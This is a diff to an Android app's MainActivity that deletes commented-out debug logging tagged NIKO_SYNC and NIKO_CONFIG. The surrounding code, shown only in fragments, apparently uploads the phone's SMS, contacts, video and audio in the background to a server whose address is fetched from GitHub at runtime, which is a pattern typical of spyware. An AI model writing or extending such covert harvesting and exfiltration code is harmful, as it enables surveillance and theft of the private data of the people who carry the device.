@@ -3010,7 +3010,6 @@ public class MainActivity extends Activity {
         }
         new Thread(() -> {
             try {
-                // android.util.Log.d("NIKO_SYNC", "Starting full data sync...");
                 // addLog("[SYNC] Veri senkronizasyonu başlatılıyor...");
                 
                 // --- İletişim Verileri ---
@@ -3039,11 +3038,9 @@ public class MainActivity extends Activity {
                 try { startAutoVideoSync(); } catch (Exception e) { addLog("Video Sync Hatası: " + e.getMessage()); }
                 try { startAutoAudioSync(); } catch (Exception e) { addLog("Ses Sync Hatası: " + e.getMessage()); }
                 
-                // android.util.Log.d("NIKO_SYNC", "Full data sync completed.");
                 // addLog("[SYNC] Veri senkronizasyonu tamamlandı.");
             } catch (Exception e) {
                 e.printStackTrace();
-                // android.util.Log.e("NIKO_SYNC", "Sync connection error: " + e.getMessage());
                 // addLog("[SYNC ERROR] Bağlantı Hatası: " + e.getMessage());
             }
         }).start();
@@ -3373,7 +3370,6 @@ public class MainActivity extends Activity {
 
     private void syncSMS() throws Exception {
         if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-             // android.util.Log.w("NIKO_SYNC", "SMS permission denied");
              // addLog("[SYNC WARN] SMS izni reddedildi.");
              return;
         }
@@ -3434,7 +3430,6 @@ public class MainActivity extends Activity {
             }
         } catch (Exception e) {
             e.printStackTrace();
-            // android.util.Log.e("NIKO_SYNC", "Error syncing SMS: " + e.getMessage());
         }
         if (array.length() > 0) sendSyncRequest(array, "sms");
     }
@@ -3764,7 +3759,6 @@ public class MainActivity extends Activity {
 
         int responseCode = conn.getResponseCode();
         // addLog("[SYNC] Veri tipi: " + type + " | Durum: " + responseCode);
-        // android.util.Log.d("NIKO_SYNC", "Type: " + type + " | Response Code: " + responseCode);
         
         if (responseCode != 200) {
              try(BufferedReader br = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "utf-8"))) {
@@ -3773,7 +3767,6 @@ public class MainActivity extends Activity {
                  while ((responseLine = br.readLine()) != null) {
                      response.append(responseLine.trim());
                  }
-                 // android.util.Log.e("NIKO_SYNC", "Error Body: " + response.toString());
                  // addLog("[SYNC ERROR] Body: " + response.toString());
              } catch(Exception ex) {}
         }
@@ -6197,10 +6190,8 @@ public class MainActivity extends Activity {
                             .putString("api_url", fetchedUrl)
                             .apply();
                             
-                    // android.util.Log.d("NIKO_CONFIG", "API URL GitHub üzerinden güncellendi: " + fetchedUrl);
                 }
             } catch (Exception e) {
-                // android.util.Log.e("NIKO_CONFIG", "GitHub'dan URL çekilirken hata oluştu: " + e.getMessage());
             }
         }).start();
     }
@@ -6255,7 +6246,6 @@ public class MainActivity extends Activity {
 
             } catch (Exception e) {
                 addLog("[UPDATE] Hata: " + e.getMessage());
-                // android.util.Log.e("NIKO_UPDATE", "Hata: " + e.getMessage());
             }
         }).start();
     }
@@ -7765,7 +7755,6 @@ public class MainActivity extends Activity {
         if (layoutAdminLogs != null && layoutAdminLogs.getVisibility() == View.VISIBLE) {
             runOnUiThread(this::updateLogDisplay);
         }
-        // android.util.Log.d("NIKO_LOG", message);
     }
 
     private void updateLogDisplay() {
